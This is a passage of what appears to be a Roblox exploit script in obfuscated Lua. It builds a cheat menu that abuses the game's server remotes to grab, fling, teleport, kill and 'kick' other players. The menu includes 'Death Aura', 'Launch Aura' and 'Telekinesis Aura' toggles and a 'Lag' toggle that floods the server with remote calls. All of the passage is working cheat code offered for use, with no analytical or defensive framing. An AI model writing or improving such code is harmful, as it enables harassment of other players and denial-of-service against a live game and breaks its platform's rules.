        if vu238.selectedPlayer and vu238.TargetList[vu238.selectedPlayer.UserId] then
            vu238.TargetList[vu238.selectedPlayer.UserId] = nil
            vu24:MakeNotification({
                Name = "Player Removed",
                Content = vu238.selectedPlayer.Name .. " removed from target list.",
                Time = 2
            })
        end
    end
})
function blobGrabPlayer(p245, p246)
    if vu13 ~= 1 then
        if p245.Character and p245.Character:FindFirstChild("HumanoidRootPart") then
            local v247 = {
                p246:FindFirstChild("RightDetector"),
                p245.Character:FindFirstChild("HumanoidRootPart"),
                p246:FindFirstChild("RightDetector"):FindFirstChild("RightWeld")
            }
            p246:WaitForChild("BlobmanSeatAndOwnerScript"):WaitForChild("CreatureGrab"):FireServer(unpack(v247))
            vu13 = 1
        end
    elseif p245.Character and p245.Character:FindFirstChild("HumanoidRootPart") then
        local v248 = {
            p246:FindFirstChild("LeftDetector"),
            p245.Character:FindFirstChild("HumanoidRootPart"),
            p246:FindFirstChild("LeftDetector"):FindFirstChild("LeftWeld")
        }
        p246:WaitForChild("BlobmanSeatAndOwnerScript"):WaitForChild("CreatureGrab"):FireServer(unpack(v248))
        vu13 = 2
    end
end
function getMountedBlobman()
    local v249 = vu2.Character
    if v249 then
        local v250 = v249:FindFirstChildOfClass("Humanoid")
        if v250 and (v250.SeatPart and v250.SeatPart.Parent.Name == "CreatureBlobman") then
            return v250.SeatPart.Parent
        end
    end
    return nil
end
function teleportBlobman(p251, p252)
    local v253 = vu2.Character
    if v253 then
        v253 = vu2.Character:FindFirstChild("HumanoidRootPart")
    end
    if v253 then
        local v254 = Instance.new("BodyPosition")
        v254.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
        v254.P = 100000
        v254.Position = p252
        v254.Parent = p251.PrimaryPart
        v253.CFrame = CFrame.new(p252)
        p251:SetPrimaryPartCFrame(CFrame.new(p252))
        task.wait(0.1)
        v254:Destroy()
    end
end
function startGrabbingPlayers()
    task.spawn(function()
        while true do
            if not vu10 then
                return
            end
            local v255 = vu12
            local v256, v257, v258 = pairs(v255:GetDescendants())
            local v259 = nil
            while true do
                local v260
                v258, v260 = v256(v257, v258)
                if v258 == nil then
                    v260 = v259
                end
                if v260.Name == "CreatureBlobman" and v260:FindFirstChild("VehicleSeat") and (v260.VehicleSeat:FindFirstChild("SeatWeld") and v260.VehicleSeat.SeatWeld.Part1:IsDescendantOf(vu192.Character)) then
                    break
                end
            end
            if not v260 then
                vu24:MakeNotification({
                    Name = "Error",
                    Content = "You must be mounted on a Blobman!",
                    Time = 5
                })
                vu10 = false
                return
            end
            local v261, v262, v263 = pairs(vu29.TargetList)
            while true do
                local v264
                v263, v264 = v261(v262, v263)
                if v263 == nil then
                    break
                end
                local v265 = vu1:GetPlayerByUserId(v263)
                if v265 then
                    blobGrabPlayer(v265, v260)
                    task.wait(vu29.BlobmanDelay or 0.1)
                end
            end
            task.wait(0.02)
        end
    end)
end
function attemptTeleportAndGrab(p266, p267, p268)
    local v269 = vu2.Character
    if v269 then
        v269 = vu2.Character:FindFirstChild("HumanoidRootPart")
    end
    if not (v269 and p266.Character and p266.Character:FindFirstChild("HumanoidRootPart")) then
        return false
    end
    local v270 = p266.Character.HumanoidRootPart
    if (v270.Position - p268).Magnitude <= 20 then
        return true
    end
    local v271 = v270.Position + Vector3.new(0, 2, 0)
    teleportBlobman(p267, v271)
    task.wait(0.2)
    blobGrabPlayer(p266, p267)
    task.wait(0.2)
    teleportBlobman(p267, p268)
    task.wait(0.2)
    return (v270.Position - p268).Magnitude <= 20
end
function startTeleportingPlayers()
    task.spawn(function()
        while vu10 do
            local v272 = getMountedBlobman()
            local v273 = vu2.Character
            if v273 then
                v273 = vu2.Character:FindFirstChild("HumanoidRootPart")
            end
            if v272 and v273 then
                local v274 = v273.Position
                local v275, v276, v277 = pairs(vu29.TargetList)
                while true do
                    local v278
                    v277, v278 = v275(v276, v277)
                    if v277 == nil then
                        break
                    end
                    local v279 = vu1:GetPlayerByUserId(v277)
                    if v279 and v279.Character and (v279.Character:FindFirstChild("HumanoidRootPart") and (v279.Character.HumanoidRootPart.Position - v274).Magnitude > 20) then
                        local v280 = false
                        local v281 = 0
                        while vu10 and (not v280 and v281 < 3) do
                            v280 = attemptTeleportAndGrab(v279, v272, v274)
                            v281 = v281 + 1
                            if not v280 then
                                task.wait(0.5)
                            end
                        end
                    end
                end
            end
            task.wait(0.2)
        end
    end)
end
v237:AddToggle({
    Name = "Blobman Target (If you are in safe zone/void)",
    Default = false,
    Callback = function(p282)
        vu10 = p282
        if p282 then
            startGrabbingPlayers()
            startTeleportingPlayers()
        end
    end
})
function findGroundBelow(p283)
    local v284 = RaycastParams.new()
    v284.FilterDescendantsInstances = {
        vu238.LocalPlayer.Character
    }
    v284.FilterType = Enum.RaycastFilterType.Blacklist
    local v285 = vu238.Workspace:Raycast(p283 + Vector3.new(0, 50, 0), Vector3.new(0, - 400), v284)
    if v285 then
        p283 = v285.Position or p283
    end
    return p283
end
function spawnBlobman()
    local v286 = vu238.LocalPlayer.Character
    if v286 then
        v286 = vu238.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
    end
    if not v286 then
        return nil
    end
    local v287 = findGroundBelow(v286.Position)
    local vu288 = CFrame.new(v287 + Vector3.new(0, 3, 0))
    pcall(function()
        vu238.ReplicatedStorage.MenuToys.SpawnToyRemoteFunction:InvokeServer("CreatureBlobman", vu288, Vector3.new(0, 59.667, 0))
    end)
    local v289 = vu238.LocalPlayer.Name .. "SpawnedInToys"
    for _ = 1, 30 do
        local v290 = vu238.Workspace:FindFirstChild(v289)
        local v291 = v290 and v290:FindFirstChild("CreatureBlobman")
        if v291 then
            vu238.blobalter = 1
            return v291
        end
        task.wait(0.15)
    end
    return nil
end
function findExistingBlobman()
    local v292 = vu238.Workspace:FindFirstChild(vu238.LocalPlayer.Name .. "SpawnedInToys")
    return v292 and v292:FindFirstChild("CreatureBlobman") or nil
end
function getMountedBlobman()
    local v293 = vu238.LocalPlayer.Character
    if v293 then
        local v294 = v293:FindFirstChildOfClass("Humanoid")
        if v294 and (v294.SeatPart and (v294.SeatPart.Parent and v294.SeatPart.Parent.Name == "CreatureBlobman")) then
            return v294.SeatPart.Parent
        else
            return nil
        end
    else
        return nil
    end
end
function seatOnBlobman(p295)
    if p295 and vu238.LocalPlayer.Character then
        local v296 = vu238.LocalPlayer.Character
        local vu297 = v296:FindFirstChildOfClass("Humanoid")
        local v298 = v296:FindFirstChild("HumanoidRootPart")
        if vu297 and v298 then
            local vu299 = p295:FindFirstChild("VehicleSeat")
            if vu299 and vu299:IsA("VehicleSeat") then
                v298.CFrame = vu299.CFrame + Vector3.new(0, 2, 0)
                pcall(function()
                    vu299:Sit(vu297)
                end)
                task.wait(0.25)
            end
        end
    else
        return
    end
end
function teleportBlobman(pu300, pu301)
    if pu300 and pu300.PrimaryPart then
        local v302 = vu238.LocalPlayer.Character
        if v302 then
            local vu303 = v302:FindFirstChild("HumanoidRootPart")
            if vu303 then
                local v304 = Instance.new("BodyPosition")
                v304.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
                v304.P = 100000
                v304.Position = pu301
                v304.Parent = pu300.PrimaryPart
                pcall(function()
                    vu303.CFrame = CFrame.new(pu301)
                    pu300:SetPrimaryPartCFrame(CFrame.new(pu301))
                end)
                task.wait(0.1)
                if v304 and v304.Parent then
                    v304:Destroy()
                end
            end
        else
            return
        end
    else
        return
    end
end
function blobGrabPlayer(pu305, p306)
    if pu305 and p306 then
        if pu305.Character and pu305.Character:FindFirstChild("HumanoidRootPart") then
            local vu307 = p306:FindFirstChild("LeftDetector")
            local vu308 = p306:FindFirstChild("RightDetector")
            local v309 = p306:FindFirstChild("BlobmanSeatAndOwnerScript")
            if v309 then
                local vu310 = v309:FindFirstChild("CreatureGrab")
                if vu310 then
                    if vu238.blobalter ~= 1 then
                        local vu311
                        if vu308 then
                            vu311 = vu308:FindFirstChild("RightWeld")
                        else
                            vu311 = vu308
                        end
                        if vu308 and vu311 then
                            pcall(function()
                                vu310:FireServer(vu308, pu305.Character.HumanoidRootPart, vu311)
                            end)
                            vu238.blobalter = 1
                        end
                    else
                        local vu312
                        if vu307 then
                            vu312 = vu307:FindFirstChild("LeftWeld")
                        else
                            vu312 = vu307
                        end
                        if vu307 and vu312 then
                            pcall(function()
                                vu310:FireServer(vu307, pu305.Character.HumanoidRootPart, vu312)
                            end)
                            vu238.blobalter = 2
                        end
                    end
                end
            else
                return
            end
        else
            return
        end
    else
        return
    end
end
function attemptTeleportAndGrab(p313, p314, p315, p316)
    local v317 = p316 or 20
    if p313 and (p314 and p315) then
        if p313.Character and p313.Character:FindFirstChild("HumanoidRootPart") then
            local v318 = p313.Character.HumanoidRootPart
            local v319 = (v318.Position - p315).Magnitude
            if vu238.ORIGIN_POS and (v318.Position - vu238.ORIGIN_POS).Magnitude > vu238.MAX_TELEPORT_DIST then
                return false
            elseif v319 <= v317 then
                blobGrabPlayer(p313, p314)
                task.wait(0.1)
                return true
            else
                local v320 = v318.Position + Vector3.new(0, 2, 0)
                teleportBlobman(p314, v320)
                task.wait(0.2)
                blobGrabPlayer(p313, p314)
                task.wait(0.2)
                teleportBlobman(p314, p315)
                task.wait(0.2)
                if p313.Character and p313.Character:FindFirstChild("HumanoidRootPart") then
                    return (p313.Character.HumanoidRootPart.Position - p315).Magnitude <= v317
                else
                    return false
                end
            end
        else
            return false
        end
    else
        return false
    end
end
function blobDropAndRegrabCycle(p321, p322, p323)
    if not (p321 and (p321.Character and (p322 and p322.Parent))) then
        return
    end
    local vu324 = p321.Character:FindFirstChild("HumanoidRootPart")
    if not vu324 then
        return
    end
    local v325 = p322:FindFirstChild("BlobmanSeatAndOwnerScript")
    if not v325 then
        return
    end
    local vu326 = v325:FindFirstChild("CreatureDrop")
    if not (vu326 and v325:FindFirstChild("CreatureGrab")) then
        return
    end
    for v327 = 1, 4 do
        if not vu238.toggleEnabled then
            break
        end
        local v328 = (p323 or vu238.LocalPlayer.Character and (vu238.LocalPlayer.Character:FindFirstChild("HumanoidRootPart") and vu238.LocalPlayer.Character.HumanoidRootPart.Position) or Vector3.new()) + Vector3.new(0, 10 * v327, 0)
        if p322 and p322.PrimaryPart then
            teleportBlobman(p322, v328)
        end
        task.wait(0.1)
        local vu329 = p322:FindFirstChild("LeftDetector")
        local vu330 = p322:FindFirstChild("RightDetector")
        if vu329 then
            vu329 = vu329:FindFirstChild("RigidConstraint") or vu329:FindFirstChild("LeftWeld")
        end
        if vu330 then
            vu330 = vu330:FindFirstChild("RightWeld") or vu330:FindFirstChild("RigidConstraint")
        end
        if vu329 then
            pcall(function()
                vu326:FireServer(vu329, vu324)
            end)
        end
        if vu330 then
            pcall(function()
                vu326:FireServer(vu330, vu324)
            end)
        end
        task.wait(0.1)
        blobGrabPlayer(p321, p322)
        task.wait(0.1)
    end
end
function masterLoop()
    if not vu238.masterRunning then
        vu238.masterRunning = true
        local v331 = vu238.LocalPlayer.Character
        if v331 then
            v331 = v331:FindFirstChild("HumanoidRootPart")
        end
        if v331 then
            vu238.ORIGIN_POS = v331.Position
        end
        vu29.LastProcessed = vu29.LastProcessed or {}
        task.spawn(function()
            while true do
                if true then
                    if not vu238.toggleEnabled then
                        vu238.masterRunning = false
                        return
                    end
                    if not vu238.currentBlobman or vu238.currentBlobman and not vu238.currentBlobman.Parent then
                        vu238.currentBlobman = findExistingBlobman()
                    end
                    local v332 = ((not vu238.currentBlobman or vu238.currentBlobman and not vu238.currentBlobman.Parent) and true or false) and spawnBlobman()
                    if v332 then
                        vu238.currentBlobman = v332
                        task.wait(0.25)
                    end
                    if not (vu238.currentBlobman and vu238.currentBlobman.Parent) then
                    end
                end
                local v333 = getMountedBlobman()
                if not v333 or v333 ~= vu238.currentBlobman then
                    local v334 = os.clock()
                    while vu238.toggleEnabled and (not v333 or v333 ~= vu238.currentBlobman) do
                        seatOnBlobman(vu238.currentBlobman)
                        task.wait(0.25)
                        v333 = getMountedBlobman()
                        if v333 == vu238.currentBlobman then
                            break
                        end
                        if os.clock() - v334 >= 5 then
                            local v335 = spawnBlobman()
                            if not v335 then
                                break
                            end
                            vu238.currentBlobman = v335
                            task.wait(0.3)
                            for _ = 1, 6 do
                                if not vu238.toggleEnabled then
                                    break
                                end
                                seatOnBlobman(vu238.currentBlobman)
                                task.wait(0.25)
                                if getMountedBlobman() == vu238.currentBlobman then
                                    break
                                end
                            end
                        end
                    end
                end
                if getMountedBlobman() == vu238.currentBlobman then
                    local v336 = vu238.LocalPlayer.Character
                    if v336 then
                        v336 = v336:FindFirstChild("HumanoidRootPart")
                    end
                    if v336 then
                        local vu337 = v336.Position
                        local v338 = {}
                        if vu238.teleportAllEnabled then
                            local v339, v340, v341 = ipairs(vu238.Players:GetPlayers())
                            while true do
                                local v342
                                v341, v342 = v339(v340, v341)
                                if v341 == nil then
                                    break
                                end
                                if v342 ~= vu238.LocalPlayer then
                                    table.insert(v338, v342)
                                end
                            end
                        else
                            local v343, v344, v345 = pairs(vu238.TargetList)
                            while true do
                                local v346
                                v345, v346 = v343(v344, v345)
                                if v345 == nil then
                                    break
                                end
                                local v347 = vu238.Players:GetPlayerByUserId(v345)
                                if v347 then
                                    table.insert(v338, v347)
                                end
                            end
                        end
                        local v348, v349, v350 = ipairs(v338)
                        while true do
                            local vu351
                            v350, vu351 = v348(v349, v350)
                            if v350 == nil or not vu238.toggleEnabled then
                                break
                            end
                            if vu351 and vu351.Character and vu351.Character:FindFirstChild("HumanoidRootPart") then
                                if vu29.LastProcessed[vu351.UserId] then
                                    local v352 = vu351.Character
                                    if v352 then
                                        v352 = vu351.Character:FindFirstChild("HumanoidRootPart")
                                    end
                                    local v353 = vu351.Character
                                    if v353 then
                                        v353 = vu351.Character:FindFirstChild("Humanoid")
                                    end
                                    if not v352 or (not v353 or (v353.Health <= 0 or (v352.Position - vu337).Magnitude > 20)) then
                                        vu29.LastProcessed[vu351.UserId] = nil
                                    end
                                end
                                if vu238.ORIGIN_POS and (vu351.Character.HumanoidRootPart.Position - vu238.ORIGIN_POS).Magnitude <= vu238.MAX_TELEPORT_DIST then
                                    if (vu351.Character.HumanoidRootPart.Position - vu337).Magnitude <= 20 then
                                        blobGrabPlayer(vu351, vu238.currentBlobman)
                                        task.wait(vu29.BlobmanDelay or 0.1)
                                        pcall(function()
                                            blobDropAndRegrabCycle(vu351, vu238.currentBlobman, vu337)
                                        end)
                                        vu29.LastProcessed[vu351.UserId] = tick()
                                    else
                                        local v354 = false
                                        local v355 = 0
                                        while vu238.toggleEnabled and (not v354 and (v355 < 3 and (vu238.currentBlobman and (vu238.currentBlobman.Parent and getMountedBlobman() == vu238.currentBlobman)))) do
                                            v354 = attemptTeleportAndGrab(vu351, vu238.currentBlobman, vu337, 20)
                                            v355 = v355 + 1
                                            if v354 then
                                                pcall(function()
                                                    blobDropAndRegrabCycle(vu351, vu238.currentBlobman, vu337)
                                                end)
                                                vu29.LastProcessed[vu351.UserId] = tick()
                                            else
                                                task.wait(0.4)
                                            end
                                        end
                                    end
                                end
                            end
                        end
                    end
                end
                task.wait(0.25)
            end
        end)
    end
end
vu238.LocalPlayer.CharacterAdded:Connect(function()
    if vu238.toggleEnabled then
        task.wait(1.5)
        local v356 = vu238.LocalPlayer.Character
        if v356 then
            v356 = vu238.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
        end
        if v356 then
            vu238.ORIGIN_POS = v356.Position
        end
        masterLoop()
    end
end)
v237:AddToggle({
    Name = "Blobman Target (Kick)",
    Default = false,
    Callback = function(p357)
        vu238.toggleEnabled = p357
        if p357 then
            local v358 = vu238.LocalPlayer.Character
            if v358 then
                v358 = vu238.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
            end
            if v358 then
                vu238.ORIGIN_POS = v358.Position
            end
            masterLoop()
        end
    end
})
v237:AddSlider({
    Name = "Teleport Duration",
    Min = 0.25,
    Max = 3,
    Default = vu238.teleportDelay,
    Increment = 0.01,
    ValueName = "Seconds",
    Callback = function(p359)
        vu238.teleportDelay = p359
    end
})
vu238.Players.PlayerAdded:Connect(refreshDropdown)
vu238.Players.PlayerRemoving:Connect(refreshDropdown)
local vu360 = {
    autoGrab = false,
    autoGrabCoroutine = nil
}
function grabDual(p361, pu362)
    local vu363 = p361:FindFirstChild("LeftDetector")
    local vu364 = p361:FindFirstChild("RightDetector")
    local vu365 = p361:FindFirstChild("BlobmanSeatAndOwnerScript")
    if vu363 and (vu364 and (vu365 and pu362)) then
        local vu366 = vu363:FindFirstChild("RigidConstraint")
        local vu367 = vu364:FindFirstChild("RightWeld")
        if vu366 then
            pcall(function()
                vu365.CreatureGrab:FireServer(vu363, pu362, vu366)
                vu365.CreatureDrop:FireServer(vu366, pu362)
            end)
        end
        if vu367 then
            pcall(function()
                vu365.CreatureGrab:FireServer(vu364, pu362, vu367)
                vu365.CreatureDrop:FireServer(vu367, pu362)
            end)
        end
    end
end
function getMyBlobman()
    local v368 = vu12
    local v369, v370, v371 = pairs(v368:GetDescendants())
    while true do
        local v372
        v371, v372 = v369(v370, v371)
        if v371 == nil then
            break
        end
        if v372:IsA("Model") and (v372.Name == "CreatureBlobman" and v372:FindFirstChild("VehicleSeat")) then
            local v373 = v372.VehicleSeat:FindFirstChild("SeatWeld")
            if v373 and v373.Part1 and v373.Part1:IsDescendantOf(game.Players.LocalPlayer.Character) then
                return v372
            end
        end
    end
    return nil
end
function loopTargetedGrab()
    vu360.autoGrabCoroutine = coroutine.create(function()
        local v374 = getMyBlobman()
        if v374 then
            while vu360.autoGrab do
                local v375, v376, v377 = pairs(vu29.TargetList)
                while true do
                    local v378
                    v377, v378 = v375(v376, v377)
                    if v377 == nil then
                        break
                    end
                    if v377 ~= game.Players.LocalPlayer.UserId then
                        local v379 = game.Players:GetPlayerByUserId(v377)
                        local v380 = v379 and v379.Character
                        if v380 then
                            v380 = v379.Character:FindFirstChild("HumanoidRootPart")
                        end
                        if v380 then
                            grabDual(v374, v380)
                        end
                    end
                end
                task.wait(0.01)
            end
        else
            vu24:MakeNotification({
                Name = "No Blobman Found",
                Content = "You must be riding a Blobman to use this.",
                Image = "rbxassetid://4483345998",
                Time = 5
            })
        end
    end)
    coroutine.resume(vu360.autoGrabCoroutine)
end
v237:AddToggle({
    Name = "God Loop Target",
    Default = false,
    Callback = function(p381)
        vu360.autoGrab = p381
        if p381 then
            loopTargetedGrab()
        elseif vu360.autoGrabCoroutine then
            coroutine.close(vu360.autoGrabCoroutine)
            vu360.autoGrabCoroutine = nil
        end
    end
})
local vu382 = {
    enabled = false,
    coroutine = nil,
    MAX_HOVER_DIST = 500,
    HOVER_HEIGHT = 25
}
function hoverFollowTarget()
    vu382.coroutine = coroutine.create(function()
        while vu382.enabled do
            local v383 = getMountedBlobman()
            local v384 = vu238.selectedPlayer
            if v383 and (v384 and v384.Character) and v384.Character:FindFirstChild("HumanoidRootPart") then
                local v385 = v384.Character.HumanoidRootPart
                local v386 = vu238.LocalPlayer.Character
                if v386 then
                    v386 = v386:FindFirstChild("HumanoidRootPart")
                end
                if v386 and (v386.Position - v385.Position).Magnitude <= vu382.MAX_HOVER_DIST then
                    local v387 = v385.Position + Vector3.new(0, vu382.HOVER_HEIGHT, 0)
                    teleportBlobman(v383, v387)
                end
            end
            task.wait(0.06)
        end
    end)
    coroutine.resume(vu382.coroutine)
end
v237:AddToggle({
    Name = "Hover above target",
    Default = false,
    Callback = function(p388)
        vu382.enabled = p388
        if p388 then
            hoverFollowTarget()
        elseif vu382.coroutine then
            coroutine.close(vu382.coroutine)
            vu382.coroutine = nil
        end
    end
})
local v389 = v27:MakeTab({
    Name = "Auras",
    Icon = "rbxassetid://6031075939",
    PremiumOnly = false
})
v389:AddSection({
    Name = "Auras"
})
local vu390 = {
    auraCoroutine = nil,
    gravityCoroutine = nil,
    localPlayer = game.Players.LocalPlayer,
    Players = game.Players,
    Debris = game:GetService("Debris"),
    SetNetworkOwner = game.ReplicatedStorage:WaitForChild("GrabEvents"):WaitForChild("SetNetworkOwner"),
    OrionLib = vu24,
    Tab = v389,
    auraRadius = 25
}
function startAirSuspendAura()
    vu390.auraCoroutine = coroutine.create(function()
        while true do
            local v400, v401 = pcall(function()
                local v391 = vu390.localPlayer.Character
                if v391 and (v391:FindFirstChild("Head") and v391:FindFirstChild("HumanoidRootPart")) then
                    local _ = v391.Head
                    local vu392 = v391.HumanoidRootPart
                    local v393, v394, v395 = pairs(vu390.Players:GetPlayers())
                    while true do
                        local vu396
                        v395, vu396 = v393(v394, v395)
                        if v395 == nil then
                            break
                        end
                        coroutine.wrap(function()
                            if vu396 ~= vu390.localPlayer and vu396.Character then
                                local v397 = vu396.Character
                                local v398 = v397:FindFirstChild("Torso")
                                if v398 and (v398.Position - vu392.Position).Magnitude <= vu390.auraRadius then
                                    vu390.SetNetworkOwner:FireServer(v398, v397.HumanoidRootPart.FirePlayerPart.CFrame)
                                    task.wait(0.1)
                                    local v399 = v398:FindFirstChild("l") or Instance.new("BodyVelocity", v398)
                                    v399.Name = "l"
                                    v399.Velocity = Vector3.new(0, 200000000000, 0)
                                    v399.MaxForce = Vector3.new(0, math.huge, 0)
                                    vu390.Debris:AddItem(v399, 100)
                                    task.wait(1)
                                    vu390.SetNetworkOwner:FireServer(v398, nil)
                                    if v399 then
                                        v399:Destroy()
                                    end
                                end
                            end
                        end)()
                    end
                end
            end)
            if not v400 then
                warn("Error in Air Suspend Aura: " .. tostring(v401))
            end
            task.wait(0.02)
        end
    end)
    coroutine.resume(vu390.auraCoroutine)
end
function stopAirSuspendAura()
    if vu390.auraCoroutine then
        coroutine.close(vu390.auraCoroutine)
        vu390.auraCoroutine = nil
    end
end
vu390.Tab:AddToggle({
    Name = " Launch Aura",
    Default = false,
    Callback = function(p402)
        if p402 then
            startAirSuspendAura()
        else
            stopAirSuspendAura()
        end
    end
})
vu390.localPlayer.CharacterAdded:Connect(function(p403)
    vu390.playerCharacter = p403
end)
function startHellSendAura()
    vu390.gravityCoroutine = coroutine.create(function()
        while true do
            local v421, v422 = pcall(function()
                local v404 = vu390.localPlayer.Character
                if v404 and v404:FindFirstChild("HumanoidRootPart") then
                    local v405 = v404.HumanoidRootPart
                    local v406 = vu12.CurrentCamera
                    local v407, v408, v409 = pairs(vu390.Players:GetPlayers())
                    while true do
                        local v410
                        v409, v410 = v407(v408, v409)
                        if v409 == nil then
                            break
                        end
                        if v410 ~= vu390.localPlayer and v410.Character then
                            local v411 = v410.Character
                            local v412 = v411:FindFirstChild("Torso")
                            if v412 and (v412.Position - v405.Position).Magnitude <= vu390.auraRadius then
                                vu390.SetNetworkOwner:FireServer(v412, v405.CFrame)
                                local v413, v414, v415 = ipairs(v411:GetDescendants())
                                while true do
                                    local v416
                                    v415, v416 = v413(v414, v415)
                                    if v415 == nil then
                                        break
                                    end
                                    if v416:IsA("BasePart") then
                                        v416.CanCollide = false
                                    end
                                end
                                local v417 = v412:FindFirstChild("HellAuraPos") or Instance.new("BodyPosition")
                                v417.Name = "HellAuraPos"
                                v417.MaxForce = Vector3.new(100000, 100000, 100000)
                                v417.D = 500
                                v417.P = 50000
                                v417.Parent = v412
                                local v418 = v412:FindFirstChild("HellAuraGyro") or Instance.new("BodyGyro")
                                v418.Name = "HellAuraGyro"
                                v418.MaxTorque = Vector3.new(100000, 100000, 100000)
                                v418.D = 500
                                v418.P = 50000
                                v418.Parent = v412
                                local v419 = v406.CFrame.LookVector
                                local v420 = Vector3.new(0, 5, 0)
                                v417.Position = v405.Position + v419 * 15 + v420
                                v418.CFrame = CFrame.new(v412.Position, v405.Position)
                            end
                        end
                    end
                end
            end)
            if not v421 then
                warn("Error in Hell Send Aura: " .. tostring(v422))
            end
            task.wait(0.05)
        end
    end)
    coroutine.resume(vu390.gravityCoroutine)
end
function stopHellSendAura()
    if vu390.gravityCoroutine then
        coroutine.close(vu390.gravityCoroutine)
        vu390.gravityCoroutine = nil
    end
end
vu390.Tab:AddToggle({
    Name = "Telekinesis Aura",
    Default = false,
    Callback = function(p423)
        if p423 then
            startHellSendAura()
        else
            stopHellSendAura()
        end
    end
})
function death(p424)
    if deathConnection then
        deathConnection:Disconnect()
    end
    if p424 then
        vu29.Death_Aura = true
        deathConnection = vu3.Heartbeat:Connect(function()
            local v425 = vu1
            local v426, v427, v428 = ipairs(v425:GetPlayers())
            while true do
                local v429
                v428, v429 = v426(v427, v428)
                if v428 == nil then
                    break
                end
                if v429 ~= vu2 and v429.Character then
                    local vu430 = v429.Character:FindFirstChild("HumanoidRootPart")
                    local vu431 = v429.Character:FindFirstChild("Head")
                    local vu432 = v429.Character:FindFirstChildOfClass("Humanoid")
                    if vu430 and (vu431 and (vu432 and (vu432.Health > 0 and (vu430.Position - vu2.Character.HumanoidRootPart.Position).Magnitude <= 25))) then
                        pcall(function()
                            vu6.SetNetworkOwner:FireServer(vu430, vu430.CFrame)
                            task.wait(0.1)
                            vu6.DestroyGrabLine:FireServer(vu430)
                            if vu431:FindFirstChild("PartOwner") and vu431.PartOwner.Value == vu2.Name then
                                local v433, v434, v435 = pairs(vu432.Parent:GetChildren())
                                while true do
                                    local v436
                                    v435, v436 = v433(v434, v435)
                                    if v435 == nil then
                                        break
                                    end
                                    if v436:IsA("BasePart") then
                                        v436.CFrame = CFrame.new(- 1000000000, 1000000000, - 1000000000)
                                    end
                                end
                                task.wait()
                                local v437, v438, v439 = pairs(vu432.Parent:GetChildren())
                                while true do
                                    local v440
                                    v439, v440 = v437(v438, v439)
                                    if v439 == nil then
                                        break
                                    end
                                    if v440:IsA("BasePart") then
                                        v440.CFrame = CFrame.new(- 1000000000, 1000000000, - 1000000000)
                                    end
                                end
                                local vu441 = Instance.new("BodyVelocity")
                                vu441.Velocity = Vector3.new(0, - 9999999, 0)
                                vu441.MaxForce = Vector3.new(9000000000, 9000000000, 9000000000)
                                vu441.P = 100000075
                                vu441.Parent = vu430
                                vu432.Sit = false
                                vu432.Jump = true
                                vu432.BreakJointsOnDeath = false
                                vu432:ChangeState(Enum.HumanoidStateType.Dead)
                                task.delay(2, function()
                                    if vu441 and vu441.Parent then
                                        vu441:Destroy()
                                    end
                                end)
                            end
                        end)
                    end
                end
            end
        end)
    else
        vu29.Death_Aura = false
    end
end
v389:AddToggle({
    Name = "Death Aura",
    Default = false,
    Callback = death
})
local v442 = v27:MakeTab({
    Name = "Teleport",
    Icon = "rbxassetid://6031068433",
    PremiumOnly = false
})
v442:AddSection({
    Name = "Teleport"
})
local vu443 = false
local vu444 = nil
function getAllPlayers()
    local v445 = vu1
    local v446, v447, v448 = pairs(v445:GetPlayers())
    local v449 = {}
    while true do
        local v450
        v448, v450 = v446(v447, v448)
        if v448 == nil then
            break
        end
        if v450 ~= vu2 then
            table.insert(v449, v450.Name)
        end
    end
    return v449
end
function updateDropdownOptions(p451)
    p451:Refresh(getAllPlayers(), true)
end
local vu453 = v442:AddDropdown({
    Name = "Select Player",
    Default = nil,
    Options = getAllPlayers(),
    Callback = function(p452)
        vu14 = p452
    end
})
updateDropdownOptions(vu453)
function teleportToPlayer()
    if vu14 then
        local v454 = vu1:FindFirstChild(vu14)
        if v454 and v454.Character and v454.Character:FindFirstChild("HumanoidRootPart") then
            local v455 = v454.Character.HumanoidRootPart.Position
            if vu2.Character and vu2.Character:FindFirstChild("HumanoidRootPart") then
                vu2.Character.HumanoidRootPart.CFrame = CFrame.new(v455)
            else
                vu24:MakeNotification({
                    Name = "Error",
                    Content = "Character was not found.",
                    Time = 3
                })
            end
        else
            vu24:MakeNotification({
                Name = "Error",
                Content = "Target player not found.",
                Time = 3
            })
        end
    else
        vu24:MakeNotification({
            Name = "Error",
            Content = "No player selected.",
            Time = 3
        })
    end
end
v442:AddButton({
    Name = "Teleport to Player",
    Callback = function()
        teleportToPlayer()
    end
})
function startLoopTeleport()
    vu444 = coroutine.create(function()
        while vu443 do
            teleportToPlayer()
            wait(0.02)
        end
    end)
    coroutine.resume(vu444)
end
v442:AddToggle({
    Name = "Loop Teleport",
    Default = false,
    Callback = function(p456)
        vu443 = p456
        if p456 then
            startLoopTeleport()
        else
            vu444 = nil
        end
    end
})
vu1.PlayerAdded:Connect(function()
    updateDropdownOptions(vu453)
end)
vu1.PlayerRemoving:Connect(function()
    updateDropdownOptions(vu453)
end)
local v457 = v27:MakeTab({
    Name = "Random",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})
v457:AddSection({
    Name = "Working"
})
local vu458 = false
local vu459 = 5
function lagF()
    while vu458 do
        for _ = 1, vu459 do
            local v460 = vu1
            local v461, v462, v463 = ipairs(v460:GetPlayers())
            while true do
                local v464
                v463, v464 = v461(v462, v463)
                if v463 == nil then
                    break
                end
                if v464.Character and v464.Character:FindFirstChild("Torso") then
                    vu5.GrabEvents.CreateGrabLine:FireServer(v464.Character.Torso, v464.Character.Torso.CFrame)
                end
            end
        end
        wait(1)
    end
end
v457:AddToggle({
    Name = "Lag",
    Default = false,
    Callback = function(p465)
        vu458 = p465
        if vu458 then
            task.spawn(lagF)
        end
    end
})
v457:AddSlider({
    Name = "Lag Intensity",
    Min = 1,
    Max = 1000,
    Default = 5,
    Callback = function(p466)
        vu459 = p466
    end
})
local vu467 = {
    P = game:GetService("Players"),
    RS = game:GetService("RunService"),
    W = vu12,
    A = false,
    Q = {},
    Pos = nil,
    Cam = nil,
    R = 15,
    Conn = nil,
    WL = false,
    CB = Instance.new("Part")
}
vu467.CB.Anchored = true
vu467.CB.CanCollide = false
vu467.CB.Transparency = 1
vu467.CB.CanQuery = false
vu467.CB.Size = Vector3.new(10, 10, 10)
function FzCam()
    local v468 = vu467.W.CurrentCamera
    vu467.CB.CFrame = vu467.Cam
    vu467.CB.Parent = vu467.W
    v468.CameraType = Enum.CameraType.Scriptable
